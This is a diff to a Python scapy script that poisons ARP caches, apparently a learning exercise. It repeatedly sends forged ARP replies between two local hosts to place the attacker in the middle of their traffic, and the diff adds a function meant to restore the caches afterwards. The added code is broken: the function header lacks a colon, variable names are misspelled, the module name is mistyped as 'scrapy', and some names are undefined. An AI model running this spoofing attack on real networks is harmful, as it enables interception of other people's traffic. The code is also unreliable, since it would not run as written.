@@ -10,7 +10,6 @@ def get_mac(ip):
     arp_request_broadcast = broadcast/arp_request
     scapy.srp(arp_request_broadcast)
     l_answered = scapy.srp(arp_request_broadcast, timeout=1, verbose= False)[0]
-    
     return l_answered[0][1].hwsrc
 
 
@@ -18,6 +17,16 @@ def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip)
+    destination_mac = get_mac(destinantion_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destinantion_ip, hwdst=destinantion_mac, psrc=source_ip, hwsrc=source_mac)
+    scrapy.send(packet, count=4, verbose=False) 
+
+restore("10.0.2.7","10.0.2.1") 
+
+
 
 packet_counter=0
 
@@ -29,7 +38,10 @@ try:
         spoof('10.0.2.1', '10.0.2.7')
         packet_counter=packet_counter+2
         print('\r [+] Packet sent: ' + str(packet_counter), end="")
+        sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print('\n[+] Detected CTRL + C ... Quitting.')
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
 
